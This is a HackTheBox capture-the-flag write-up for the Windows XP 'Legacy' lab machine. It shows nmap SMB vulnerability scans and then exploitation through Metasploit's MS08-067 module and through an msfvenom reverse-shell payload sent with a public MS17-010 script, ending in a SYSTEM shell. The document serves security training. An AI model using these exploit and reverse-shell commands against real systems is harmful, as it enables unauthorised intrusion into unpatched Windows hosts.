# HackTheBox
# Legacy - Writeup

---

## Initial Enumeration:
Since this is a Windows Box, we'll be running nmap with `-Pn` flag. 
>```bash
>nmap -sC -sV 10.10.10.4 -Pn
>```

```bash
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: -4h30m00s, deviation: 2h07m16s, median: -6h00m00s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:e5:e4 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-08-26T18:35:19+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

So we know that it's a Windows XP Box, so it might be vulnerable to either `MS08-067` or `MS17-010`. So, to check it, we'll run nmap with `--script=smb-vuln*` flag.

```bash
Host script results:                                                                                                                                                                                          
| smb-vuln-cve2009-3103:                                                                                                                                                                                      
|   VULNERABLE:                                                                                                                                                                                               
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)                                                                                                                                         
|     State: VULNERABLE                                                                                                                                                                                       
|     IDs:  CVE:CVE-2009-3103                                                                          
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
```
So, hence, we're sure that it is indeed vulnerable to `MS08-067`. So we'll be doing it both with and without metasploit.

---

## With Metasploit:
With Metasploit, this box is like no prep and just enter a few commands and you become 1337. So, in metasploit, we use the following set of commands:
```bash
msf6> search ms08-067
```
We only see 1 single module.
```bash

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
```
To choose this module, we use either of the following commands:
```bash
msf6> use 0
## OR
msf6> use exploit/windows/smb/ms08_067_netapi
```

Now that our module has been selected, we'll be seeing the options that we can set using the following command:

```bash
msf6 exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.0.200    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting

```

We have to set the following options:
- RHOSTS
- LHOST
- LPORT

To set these options, we use the `set` command. `RHOSTS` is the remote host or the victim machine that we'll be attacking. `LHOST` is our IP, since we're doing a HackTheBox machine, we can either type `tun0` which is our interface and metasploit will automatically resolve the interface to our ip OR, we can simply type `ip a tun0` to find our ip address and type it manually. `LPORT` is the port that we'll be listening on for a reverse shell. So, we'll use the following set of commands to set all these:
```bash
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.4
msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST tun0
msf6 exploit(windows/smb/ms08_067_netapi) > set LPORT 1337
```
Setting the port to 1337 will make us leet haxor. xd

So, all we have to do now is just type `exploit` or `run` and we'll get a meterpreter shell back.
```bash
msf6 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.14.7:1337 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:Unknown
[*] 10.10.10.4:445 - We could not detect the language pack, defaulting to English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175174 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.7:1337 -> 10.10.10.4:1028) at 2021-08-26 12:25:35 -0700

meterpreter > 
```

So, we can spawn a shell and check who we are:
```bash
meterpreter > shell
Process 1404 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>echo %username%
echo %username%
LEGACY$
C:\WINDOWS\system32>cd "C:\Documents and Settings"
cd "C:\Documents and Settings"

C:\Documents and Settings>cd Administrator\Desktop
cd Administrator\Desktop

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
********************************

```

Well, that was pretty easy, now we'll be exploiting this machine without metasploit.

## Without Metasploit:
Firstly, I found a github repository that I used to manually exploit `MS17-010`.
[Github](https://github.com/helviojunior/MS17-010) So, we'll be firstly cloning this repo:
```bash
git clone https://github.com/helviojunior/MS17-010
```
Now, we'll be checking for the available `pipes` that'll be used in exploiting.
For this, we'll be utilizing `checker.py`. Since I cloned this repository in `/opt/` directory, i'll be using the following command to invoke this:
```bash
python /opt/MS17-010/checker.py 10.10.10.4
```

```bash
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
The target is not patched

=== Testing named pipes ===
spoolss: Ok (32 bit)
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: Ok (32 bit)
```

So, now we know that we've got 2 pipes:
- spoolss
- browser
 
Since the browser always has a higher chance to be succeed, we'll be using that named pipe. Our next procedure is to craft a reverse shell executable that'll be sent and executed, for that, we'll use msfvenom.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=9001 -f exe > shell.exe
```

```bash
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
```
Now, we'll need to setup a listener for the reverse shell, we can use `nc`:
```bash
nc -lvnp 9001
```
Once the listener is setup, in another pane, we'll need to send this payload, we'll use the `send_and_execute.py` script.
```bash
python /opt/MS17-010/send_and_execute.py
/opt/MS17-010/send_and_execute.py <ip> <executable_file> [port] [pipe_name]
```
So , we'll use the following command to send the payload on the `browser` pipe:
```bash
python /opt/MS17-010/send_and_execute.py 10.10.10.4 shell.exe 445 browser
```

```bash
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1                                                                                 
Groom packets        
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x8203a958
SESSION: 0xe1760918
FLINK: 0x7bd48 
InData: 0x7ae28                                   
MID: 0xa                          
TRANS1: 0x78b50               
TRANS2: 0x7ac90       
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe1afdd78
userAndGroupCount: 0x3               
userAndGroupsAddr: 0xe1afde18
overwriting token UserAndGroups
Sending file BO4G1F.exe...                                                                             
Opening SVCManager on 10.10.10.4.....
Creating service SCWF.....      
Starting service SCWF.....
.....................................
```
Now, checking the listener, we can see that we've received our shell:
```bash
Listening on 0.0.0.0 9001
Connection received on 10.10.10.4 1030

Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>echo %username%
echo %username%
LEGACY$
C:\WINDOWS\system32>cd "C:\Documents and Settings"
cd "C:\Documents and Settings"

C:\Documents and Settings>cd Administrator\Desktop
cd Administrator\Desktop

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
********************************
```

---
